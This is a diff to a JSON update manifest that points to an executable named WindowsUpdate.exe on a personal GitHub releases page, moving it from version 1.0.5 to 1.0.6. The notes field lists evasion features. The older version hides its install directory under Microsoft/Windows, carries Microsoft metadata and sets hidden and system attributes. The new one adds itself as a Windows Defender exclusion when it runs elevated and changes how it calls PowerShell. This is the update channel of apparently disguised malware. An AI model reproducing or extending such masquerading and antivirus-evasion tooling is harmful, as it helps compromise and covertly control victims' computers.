@@ -1,6 +1,6 @@
 ﻿{
-    "url":  "https://github.com/sayamuhbani59-collab/homectrl-updates/releases/download/v1.0.5/WindowsUpdate.exe",
-    "sha256":  "41220cd645d59605293c868c789de7657fd85861dc2f3c967d5c7d28b2000ba0",
-    "version":  "1.0.5",
-    "notes":  "Stealth: hidden install dir (Microsoft/Windows/), MS metadata, hidden+system attrs"
+    "url":  "https://github.com/sayamuhbani59-collab/homectrl-updates/releases/download/v1.0.6/WindowsUpdate.exe",
+    "sha256":  "76a304ed7e994c2e87e2e46f25632717ff73b485a14c05f93eb59e5d5949bf2a",
+    "version":  "1.0.6",
+    "notes":  "Auto Defender exclusion (elevated), --install-admin flag, plain PS instead of EncodedCommand"
 }
